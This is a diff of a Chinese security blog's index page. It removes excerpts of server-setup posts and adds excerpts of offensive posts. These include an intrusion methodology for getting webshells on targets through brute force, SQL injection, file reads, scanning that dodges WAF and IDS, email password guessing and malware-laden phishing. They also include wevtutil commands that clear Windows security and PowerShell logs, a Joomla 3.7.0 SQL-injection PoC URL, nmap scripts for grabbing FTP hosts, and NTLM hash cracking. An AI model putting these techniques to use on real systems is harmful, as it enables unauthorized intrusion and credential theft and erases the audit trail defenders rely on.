@@ -139,237 +139,6 @@
 
     <div class="post-header index">
         <h1 class="title">
-            <a href="/2017/07/03/nginx1-12-env/">
-                极速部署 nginx 1.12.0
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2017-07-03</span>
-            
-            
-            
-                <span class="category">
-                    <a href="/categories/env/">env</a>
-                </span>
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            <p><br><br>00x1 依旧是先简单的科普:<br>&nbsp;&nbsp;&nbsp;&nbsp;nginx [tengine基于Nginx的变种] 一款流行的开源web中间件,基于c,毛子写的,支持高并发[epoll模型,日PV2000W以内基本是没什么感觉的],不过,高并发仅仅是针对静态资源来说的,如果是动态资源还要看后端脚本和数据库的实际处理速度,另外,它本身占用资源较少,配置也十分方便灵活</p>
-<p>00x2 除了提供基本的web服务相关功能之外,它也提供了很多其它的很实用的功能[都是基于模块的形式]:<br><figure class="highlight clean"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">动态脚本解析服务</div><div class="line">反向代理[类似负载均衡,f5,a10]</div><div class="line">提供缓存功能,类似ats varnish...</div><div class="line">....</div></pre></td></tr></table></figure></p>
-<p>00x3 安装 nginx前的一些必要的准备工作:<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> rpm -qa pcre pcre-devel openssl-devel		正则库,nginx中的rwrite模块会用到,后面是加密函数库,https要用到</span></div><div class="line"><span class="meta">#</span><span class="bash"> mount /dev/cdrom /mnt/cdrom/  		因为我这里用的是本地yum源,所以需要先挂下光盘,如果你直接用的网络yum源,可以忽略此步骤</span></div><div class="line"><span class="meta">#</span><span class="bash"> yum install pcre pcre-devel openssl openssl-devel -y		安装所需的所有依赖库</span></div><div class="line"><span class="meta">#</span><span class="bash"> useradd -s /sbin/nologin -M nginx		创建nginx服务用户,既是服务用户,也就意味着它并不需要登陆系统,更不需要有家目录</span></div></pre></td></tr></table></figure></p>
-        </div>
-        <a href="/2017/07/03/nginx1-12-env/" class="read-more">Read More</a>
-    
-
-</div>
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/2017/07/02/mysql-bin-install/">
-                mysql5.5 二进制包单实例极速部署
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2017-07-02</span>
-            
-            
-            
-                <span class="category">
-                    <a href="/categories/env/">env</a>
-                </span>
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            <p><br><br>00x1 关于数据库的简单科普:<br><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">关系型数据库:</div><div class="line">	mysql,mssql,db2,oracle</div><div class="line">	二维表 <span class="string">[ 基于标准sql操作 ]</span></div></pre></td></tr></table></figure></p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">非关系型数据库:</div><div class="line">	memcached,redis</div><div class="line">	键值对 [ <span class="function"><span class="params">key</span> =&gt;</span> value ]</div></pre></td></tr></table></figure>
-<p>00x2 mysql 当下主流版本:<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="number">5.1</span> / <span class="number">5.4</span> / <span class="number">5.5</span> /  <span class="number">5.6</span> /  <span class="number">5.7</span></div></pre></td></tr></table></figure></p>
-<p>00x3 下载 mysql5.5 [ 暂以二进制包安装配置为例,注意,二进制包解压即可使用 ]:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># wget http://dev.mysql.com/get/Downloads/MySQL-5.5/mysql-5.5.49-linux2.6-x86_64.tar.gz</div></pre></td></tr></table></figure></p>
-<p>00x4 快速初始化配置[脚本中的默认路径都是在/usr/local/mysql下],首先,创建mysql服务用户[相信,不管什么时候尽可能以一个较低的系统身份权限运行服务会是个很好的习惯]:<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> useradd mysql -s /sbin/nologin -M	  不需要登陆系统,更不需要有家目录</span></div><div class="line"><span class="meta">#</span><span class="bash"> tar xf mysql-5.5.49-linux2.6-x86_64.tar.gz  二进制包,相当于win下的绿色软件,<span class="string">"免注册"</span>,直接运行即可</span></div><div class="line"><span class="meta">#</span><span class="bash"> mv mysql-5.5.49-linux2.6-x86_64 /usr/<span class="built_in">local</span>/mysql-5.5.49</span></div><div class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">cd</span> /usr/<span class="built_in">local</span>/ ;ln -s mysql-5.5.49/ mysql</span></div></pre></td></tr></table></figure></p>
-        </div>
-        <a href="/2017/07/02/mysql-bin-install/" class="read-more">Read More</a>
-    
-
-</div>
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/2017/06/30/httpd2-2-env/">
-                httpd 2.2.34 极速部署
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2017-06-30</span>
-            
-            
-            
-                <span class="category">
-                    <a href="/categories/env/">env</a>
-                </span>
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            <p><br><br>00x1 当下主流的一些 apache版本:<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="number">1.3</span> / <span class="number">2.0</span> / <span class="number">2.2</span> / <span class="number">2.4</span></div></pre></td></tr></table></figure></p>
-<p>00x2 快速编译配置并启动 apache 2.2:<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> yum install zlib zlib-devel -y</span></div><div class="line"><span class="meta">#</span><span class="bash"> wget http://mirror.bit.edu.cn/apache/httpd/httpd-2.2.34.tar.gz</span></div><div class="line"><span class="meta">#</span><span class="bash"> tar xf httpd-2.2.34.tar.gz</span></div><div class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">cd</span> httpd-2.2.34</span></div><div class="line"><span class="meta">#</span><span class="bash"> ./configure --prefix=/usr/<span class="built_in">local</span>/httpd-2.2.34 --<span class="built_in">enable</span>-deflate --<span class="built_in">enable</span>-expires --<span class="built_in">enable</span>-headers --<span class="built_in">enable</span>-modules=most --<span class="built_in">enable</span>-so --with-mpm=worker --<span class="built_in">enable</span>-rewrite</span></div><div class="line"><span class="meta">#</span><span class="bash"> make &amp;&amp; make install</span></div><div class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">echo</span> $?</span></div><div class="line"><span class="meta">#</span><span class="bash"> ln -s /usr/<span class="built_in">local</span>/httpd-2.2.34/ /usr/<span class="built_in">local</span>/httpd</span></div><div class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">cd</span> /usr/<span class="built_in">local</span>/httpd &amp;&amp; ll</span></div><div class="line"><span class="meta">#</span><span class="bash"> /usr/<span class="built_in">local</span>/httpd/bin/apachectl -l		查看所编译的模块</span></div><div class="line"><span class="meta">#</span><span class="bash"> /usr/<span class="built_in">local</span>/httpd/bin/apachectl start		启动apache</span></div><div class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">echo</span> <span class="string">"/usr/local/httpd/bin/apachectl start"</span> &gt;&gt; /etc/rc.local	加入自启动</span></div><div class="line"><span class="meta">#</span><span class="bash"> vi /usr/<span class="built_in">local</span>/httpd/conf/httpd.conf 		修改apache主配置文件</span></div><div class="line">	ServerName 127.0.0.1:80			改下机器名,要不然每次启动都会警告</div><div class="line"><span class="meta">#</span><span class="bash"> /usr/<span class="built_in">local</span>/httpd/bin/apachectl -t		检查语法</span></div><div class="line"><span class="meta">#</span><span class="bash"> /usr/<span class="built_in">local</span>/httpd/bin/apachectl graceful	平滑重启</span></div><div class="line"><span class="meta">#</span><span class="bash"> curl 127.0.0.1</span></div></pre></td></tr></table></figure></p>
-        </div>
-        <a href="/2017/06/30/httpd2-2-env/" class="read-more">Read More</a>
-    
-
-</div>
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/2017/06/28/php-combile/">
-                极速编译配置 php 5.3.27
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2017-06-28</span>
-            
-            
-            
-                <span class="category">
-                    <a href="/categories/env/">env</a>
-                </span>
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            <p><br><br>00x1 关于FastCGI的作用:<br>&nbsp;&nbsp;&nbsp;&nbsp;http服务和动态脚本之间的通信接口,把http服务解析和动态脚本解析分开,apache,nginx默认都支持FastCGI</p>
-<p>00x2 以 Nginx+Php 为例,简述 FastCGI 大致工作原理:<br><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Nginx<span class="string">[fastcgi_pass]</span>  &lt; -- &gt;  Php<span class="string">[php-fpm,可以同时起多个,加快处理速度]</span> wrapper<span class="string">[启动php解析器]</span> &lt; -- &gt; php解析器<span class="string">[读取php.ini]</span> &lt;--&gt; database<span class="string">[增删改查]</span></div><div class="line">		|					|</div><div class="line">	Fastcgi Client端			Fastcgi Server端<span class="string">[php-fpm.conf]</span></div></pre></td></tr></table></figure></p>
-<p>00x3 php 5.3.27 的具体编译安装过程:<br>前期环境准备 [必须先装好nginx和MySQL再来装php]:<br><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">nginx</span> 1<span class="selector-class">.12</span>	已完全部署配置完毕,且服务已正常启动</div><div class="line"><span class="selector-tag">mysql</span> 5<span class="selector-class">.5</span>	已完全部署配置完毕,且服务已正常启动</div></pre></td></tr></table></figure></p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> /usr/<span class="built_in">local</span>/nginx/sbin/nginx</span></div><div class="line"><span class="meta">#</span><span class="bash"> /usr/<span class="built_in">local</span>/mysql/bin/mysql</span></div><div class="line"><span class="meta">#</span><span class="bash"> netstat -tulnp</span></div></pre></td></tr></table></figure>
-        </div>
-        <a href="/2017/06/28/php-combile/" class="read-more">Read More</a>
-    
-
-</div>
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/2017/06/27/mysql51-compile/">
-                极速编译安装 mysql 5.1
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2017-06-27</span>
-            
-            
-            
-                <span class="category">
-                    <a href="/categories/env/">env</a>
-                </span>
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            <p>00x1 创建 mysql 服务用户:<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> groupadd mysql</span></div><div class="line"><span class="meta">#</span><span class="bash"> useradd mysql -s /sbin/nologin -M -g mysql</span></div></pre></td></tr></table></figure></p>
-<p>00x2 下载编译安装 mysql5.1:<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> yum install ncurses-devel -y 	mysql需要此库的支持</span></div><div class="line"><span class="meta">#</span><span class="bash"> wget http://sources.openelec.tv/mirror/mysql/mysql-5.1.68.tar.gz</span></div><div class="line"><span class="meta">#</span><span class="bash"> tar xf mysql-5.1.68.tar.gz</span></div><div class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">cd</span> mysql-5.1.68</span></div></pre></td></tr></table></figure></p>
-        </div>
-        <a href="/2017/06/27/mysql51-compile/" class="read-more">Read More</a>
-    
-
-</div>
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/2017/06/26/php-5-5-38/">
-                极速部署 php5.5.38
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2017-06-26</span>
-            
-            
-            
-                <span class="category">
-                    <a href="/categories/env/">env</a>
-                </span>
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            <p><br><br>00x1 检查安装各种依赖库:<br><figure class="highlight elm"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># rpm -qa zlib-devel libxml2-devel libjpeg-devel libiconv-devel free<span class="keyword">type</span>-devel libpng-devel gd-devel curl-devellibxslt-devel</div></pre></td></tr></table></figure></p>
-<p>配置yum源[同样,还是用网易的]:<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">cd</span> /etc/yum.repos.d</span></div><div class="line"><span class="meta">#</span><span class="bash"> wget http://mirrors.163.com/.<span class="built_in">help</span>/CentOS6-Base-163.repo</span></div><div class="line"><span class="meta">#</span><span class="bash"> mv CentOS6-Base-163.repo CentOS-Base.repo</span></div><div class="line"><span class="meta">#</span><span class="bash"> yum clean all</span></div><div class="line"><span class="meta">#</span><span class="bash"> yum makecache</span></div></pre></td></tr></table></figure></p>
-        </div>
-        <a href="/2017/06/26/php-5-5-38/" class="read-more">Read More</a>
-    
-
-</div>
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/2017/06/24/php-5-2-17/">
-                重温经典的 php 5.2.17
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2017-06-24</span>
-            
-            
-            
-                <span class="category">
-                    <a href="/categories/env/">env</a>
-                </span>
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            <p>00x1 php 5.2.17 [一个比较经典的php版本],安装环境准备[对于centos5.x直接用 yum groupinstall “X Software Development” 这个包组就可以了]:</p>
-<p>中间可能还有些库可能直接用yum装不上,不过没关系,后面再单独装就好了<br><figure class="highlight elm"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># yum install -y zlib zlib-devel libxml libxml2-devel libjpeg libjpeg-devel libpng libpng-devel free<span class="keyword">type</span> freetype-devel gd gd-devel curl curl-devel libiconv</div></pre></td></tr></table></figure></p>
-<p>安装 libiconv 字体库:<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> tar xf libiconv-1.14.tar.gz</span></div><div class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">cd</span> libiconv-1.14</span></div><div class="line"><span class="meta">#</span><span class="bash"> ./configure --prefix=/usr/<span class="built_in">local</span>/libiconv</span></div><div class="line"><span class="meta">#</span><span class="bash"> make &amp;&amp; make install</span></div><div class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">echo</span> $?</span></div></pre></td></tr></table></figure></p>
-        </div>
-        <a href="/2017/06/24/php-5-2-17/" class="read-more">Read More</a>
-    
-
-</div>
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
             <a href="/2017/06/19/https-mitmf/">
                 https 中间人劫持全过程
             </a>
@@ -455,6 +224,230 @@
             <p><br><br>如果是针对某种开源程序[ 如,wordpress,drupal,joomla,discuz,opencart,phpbb,SquirrelMail…… ]:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">先想办法确定其对应的具体版本号,然后去找下该版本曾经爆过的一些exp并尝试利用,不过在此之前,最好先自己在本地搭环境测一下,成功以后再丢到目标上去搞不迟</div><div class="line">只不过,你可能事先需要对各种开源程序拿shell的方式比较熟悉</div></pre></td></tr></table></figure></p>
 <p>如果是针对非开源程序[ 应该尽量先直奔一些比较高危的漏洞去,因为我们最终的目的可能还是想快速get到目标的webshell,没必要在一些边缘性的漏洞利用上浪费太多的时间 ]:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">首先,找目标网站的各种web入口[ 这里并不仅限目标网站后台,如,各种数据库的web管理入口(phpmyadmin),各类java控制台……都是可以的,如果连入口都没有,后面有些漏洞利用就比较尴尬了],找到以后,可以先顺手简单尝试些弱口令[尽量多试几个,没有验证码的情况下,也可尝试爆破],万能密码[sql注入的一种,需要自己平时多搜集一些],未授权访问[有些后台可能会存在这样的问题,页面权限控制不好所致]</div><div class="line">找目标网站的各种上传点[包括各类漏洞编辑器路径],挨个尝试上传……</div><div class="line">多翻翻目标网站,仔细观察下请求,尝试利用可能存在包含或者任意文件读取[如,xxe]的各种参数</div><div class="line">同样是看请求,找各种可能存在执行,反序列化,ssrf...类的参数进行尝试,说实话,对这类的漏洞,如果不审代码,仅仅单靠盲测[想成功拼接利用还是比较困难的,起码我自己还没有这么成功过,嘿嘿……,话说回来,像命令执行这类的漏洞可以在发邮件的地方顺手尝试下,仅仅对于php而言哈,说不定有惊喜呢],除非一些非常特殊的功能,不过那个,差不多能一眼看出来</div><div class="line">扫下目标的svn,如果可以利用的话,看看能不能从里面下到一些目标的敏感配置文件什么的,主要想拿一些账号密码</div><div class="line">找各种可能存在sql注入的参数,挨个尝试,观察目标响应</div><div class="line">尝试找一些下载点参数,看看能不能把目标的脚本文件也给下下来</div><div class="line">找目录遍历,看能不能从中看到一些目标的敏感文件什么的,比如,各种网站,数据库备份文件,各类探针文件,密码文件,源码泄露等等……顺手给下下来</div><div class="line">实在不能遍历,不妨尝试用字典[前提是字典要靠谱才行]或者wvs,慢慢跑一下目标站的各种敏感目录文件</div><div class="line">如果目标网站起来的时间比较长的话,也可以利用谷歌来爬一些敏感参数,文件及网站错误什么的</div><div class="line">看有没有好下手点儿的子域,尝试从那儿进去也是可以的</div><div class="line">观察目标站到底用的那种web服务器,具体什么版本的,看看有没有一些可以快速远程利用的exp,比如,tomcat,apache,iis[<span class="number">6.0</span>] 曾经的各种RCE……</div><div class="line">如果目标用网站是基于某种框架[strus2,tp……],可以先确定其对应的具体框架版本,然后去找一些针对此框架的exp尝试利用,还是那句话,先自己在本地测成功了,再丢到目标上搞</div><div class="line">再如果,目标用的是一些比较不知名的小众程序[嘿嘿……]像wp,joomla,或者drupal这种全球知名的就算了吧,暂时没必要,也没能力去独立审],在上面这些办法都搞不定的情况下,可以尝试把目标用的程序对应版本的的源码搞一份,down下来多花点儿时间好好审审,也许能审出一点点突破</div><div class="line">如果你实在觉得,这样手工搞下去,希望不大,不妨直接丢给各种web wvs 自己去扫就好了[当然啦,前提得目标<span class="string">'让'</span>你扫才行,对于那些上了各种waf,ids的目标,还是手工低调的慢慢搞比较好一点],记得尽量把高危的一些规则集事先更新一下,切记,务必慢慢扫[别着急],避免惹一些不必要的麻烦[主要是各类防火墙,频繁的切代理,比较烦,tor也比较慢....]</div><div class="line">如果上面的这些还不太好使,这时可以先确定目标站的真实ip[务必是目标站的真实ip,相信这些东西,在信息搜集阶段你就已经搞定了],然后再想办法从旁站搞,如果旁站也不行,可以再试C段[包括C段的web和端口(尤其是sa),实在没办法再试这个,如果都是linux 虚拟机,说实话,不太好提,另外,没必要在C段浪费太多时间,能有一个进去就行了]</div><div class="line">关于xss的利用,这里就不多说了,因为个人确实不太擅长这方面[对于自己手里现有的目标想很好的利用起来太难了,有发xss的机会不如直接发马来的更直接],不过需要你自己先把xss平台搭起来[如果你喜欢把beef转发出来也行,随意,看你自己],一般在我自己的目标里,xss还是蛮多的,但利用比较困难,实际给目标发信的效果也并不太好[可能是太多人发过太多次了吧,人基本都不鸟你了],利用这种方式来getshell还是比较曲折的,当然,并不是说它没有用,相反,如果用好了,还是非常牛逼的……</div><div class="line">当你把这些都尝试完[可能此时已经过了一个多星期了或者更长时间],依旧一无所获,别伤心,因为还有端口没试过,扫下目标站都跑了什么服务[这里务必是真实目标ip],尝试利用下各种漏洞服务,实在不行,起码你还可以爆破[前提是字典务必要精心做,在前面大量的信息搜集中,相信你已经拿到了一些敏感信息,然后你可以根据已搜集到的这些信息来做字典]</div><div class="line">如果你实在觉得端口也没什么希望了,不妨尝试爆破下目标域名的注册邮箱,虽然稍微有点儿偏离目标了,好歹也是个入手点,万一成功了呢,至于后续的劫持社工什么的就要看你自己的了</div><div class="line">一边搜集目标邮箱,撞密码,一边找目标的各种内网入口[如,vpn,owa……][如果你确定目标有内网],尝试登陆</div><div class="line">如果以上方式全废,而且你手里又没有可直接远程利用0day的情况下,发信吧,简单,粗暴,直接,收获快,虽然现在希望已经越来越小,但万一上了呢,总归是个突破口</div><div class="line">当然,真的有条件的情况下,尝试路由或者实地无线渗透,也是可行的[不过,这中间还有很多不确定因素,需要相互配合才行],关于其它的一些东西,自己目前暂时也还在努力学习中,这里不多说了</div><div class="line">说了这么多废话,其实就想告诉大家,一直保持住自己良好的学习习惯,不断巩固更新自己现有的知识深度,并且好好坚持下去,这比任何技巧姿势都重要 [始终坚信,所有的复杂都是简单的堆积]</div><div class="line">这里纯粹就是自己的一点点经验小结,因为个人能力实在有限,有很多很多的不足是肯定的,虽然这里说的感觉好像很容易,但实际渗透中,远非如此,中间还会有非常非常多的各种各样的问题,等着我们慢慢去解决,自己也一直在努力学习中,希望表哥们能多多交流提携……</div><div class="line">待续……</div></pre></td></tr></table></figure></p>
 
+        </div>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2017/05/19/wevtutil/">
+                针对 win 安全日志的简单处理 [权限要高是必须的],实际渗透中不应该是第一选择
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2017-05-19</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/wevtutil/">wevtutil</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p><br></p>
+<p>0x01 入侵日志处理作为后渗透环节的重要组成部分,可能很多朋友在实际渗透中,对它貌似都并不怎么上心[ 但确实又很重要 ],利用win带的 wevtutil 日志管理工具[win 7以后自带,03之前的系统就不说了吧,大家都很熟悉了]可以很方便[‘不过,有点儿太方便了’]的帮我们处理一些敏感的系统安全类日志,既然要涉及到系统的安全审计,’管理员权限’ 自然是少不了的:<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> wevtutil el | more 			 	查看系统日志列表项</span></div><div class="line"><span class="meta">#</span><span class="bash"> wevtutil cl <span class="string">"windows powershell"</span> 		清除powershell日志</span></div><div class="line"><span class="meta">#</span><span class="bash"> wevtutil cl <span class="string">"security"</span> 	 		清除系统安全日志</span></div><div class="line"><span class="meta">#</span><span class="bash"> wevtutil cl <span class="string">"system"</span>     			清除系统日志</span></div><div class="line"><span class="meta">#</span><span class="bash"> wevtutil cl <span class="string">"application"</span>  			清除应用程序日志</span></div><div class="line">……</div></pre></td></tr></table></figure></p>
+        </div>
+        <a href="/2017/05/19/wevtutil/" class="read-more">Read More</a>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2017/05/18/nmap-script/">
+                nmap 进阶使用 [ 脚本篇 ]
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2017-05-18</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/nmap/">nmap</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p><br></p>
+<p>因为今天的重点并非nmap本身,这次主要还是想给大家介绍它的一些相对比较实用的脚本,所以一些选项的具体作用就不再说了,详情可参考端口渗透相关文章,实际中我们可以先用下面的语句,大概扫一眼目标机器或者目标C段都跑了什么服务,心里务必要先有个谱:<br><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># <span class="selector-tag">nmap</span> <span class="selector-tag">-sV</span> <span class="selector-tag">-sT</span> <span class="selector-tag">-Pn</span> <span class="selector-tag">-v</span> 192<span class="selector-class">.168</span><span class="selector-class">.3</span><span class="selector-class">.23</span></div></pre></td></tr></table></figure></p>
+<p>当然,你也可以尝试获取目标机器各个服务更详细的banner:<br><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># <span class="selector-tag">nmap</span> <span class="selector-tag">-sT</span> <span class="selector-tag">-Pn</span> <span class="selector-tag">-v</span> <span class="selector-tag">banner</span><span class="selector-class">.nse</span> 192<span class="selector-class">.168</span><span class="selector-class">.3</span><span class="selector-class">.23</span></div></pre></td></tr></table></figure></p>
+<p>ftp相关的一些漏洞检测脚本:<br><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">ftp-anon</span><span class="selector-class">.nse</span>	检查目标<span class="selector-tag">ftp</span>是否允许匿名登录,光能登陆还不够,它会自动检测目录是否可读写,批量抓<span class="selector-tag">ftp</span>肉鸡,可用</div><div class="line"># <span class="selector-tag">nmap</span> <span class="selector-tag">-p</span> 21 <span class="selector-tag">--script</span> <span class="selector-tag">ftp-anon</span><span class="selector-class">.nse</span> <span class="selector-tag">-v</span> 192<span class="selector-class">.168</span><span class="selector-class">.3</span><span class="selector-class">.23</span></div></pre></td></tr></table></figure></p>
+        </div>
+        <a href="/2017/05/18/nmap-script/" class="read-more">Read More</a>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2017/05/18/joomla-3-70-exp-getshell/">
+                Joomla 3.70 com_fields组件sql注入及joomla3.x拿shell
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2017-05-18</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/joomla-exp/">joomla exp</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p><br><br>大致 poc 如下:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.23/</span>Joomla_3.<span class="number">7.0</span>-Stable-Full_Package/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=extractvalue(rand(),concat(<span class="number">0x3a</span>,user()))</div></pre></td></tr></table></figure></p>
+<p><img src="/img/joomla 370 poc.png" alt=""><br><br>
+        </div>
+        <a href="/2017/05/18/joomla-3-70-exp-getshell/" class="read-more">Read More</a>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2017/05/15/RainbowCrack/">
+                使用 rainbowcrack 快速破解 ntlm
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2017-05-15</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/rainbowcrack/">rainbowcrack</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p><br><br>0x01 RainbowCrack简介<br>&nbsp;&nbsp;&nbsp;&nbsp;今天就来介绍另一款相对比较实用的NTLM hash破解工具,其本质是基于事先生成好的对应各种散列类型的彩虹表,支持GPU[amd/英伟达]加速,通常,就我个人来讲,主要都是用它来跑NTLM的,想比之下,要比之前所介绍的两款hash破解工具弱很多,虽然没那么智能,但它使用非简单,极易上手,平台支持也相对比较好,此次暂以win平台为例进行简单演示<br><br><br>0x02 关于 RainbowCrack 套件的基本使用流程,如下<br><figure class="highlight xl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">创建彩虹表[<span class="function"><span class="title">rtgen</span>] -&gt;</span> 对彩虹表进行排序[<span class="function"><span class="title">rtsort</span>] -&gt;</span> 开始真正的hash破解过程[rcrack]</div></pre></td></tr></table></figure></p>
+<p><br></p>
+<p>0x03 开始创建彩虹表<br>&nbsp;&nbsp;&nbsp;&nbsp;简单来说,彩虹表内部其实就是由所有可能组合的明文和其所对应的hash组成,类似nosql中的键值对形式[难道是因为这样效率就会很高吗,其实具体的数据结构自己也并不是非常清楚,还是那句话,实际渗透中能上就好],其实说白点还是基于字典,只不过这个字典是经过优化的,rtgen具体参数作用如下:<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> rtgen.exe hash_algorithm charset plaintext_len_min plaintext_len_max table_index chain_len chain_num part_index</span></div></pre></td></tr></table></figure></p>
+        </div>
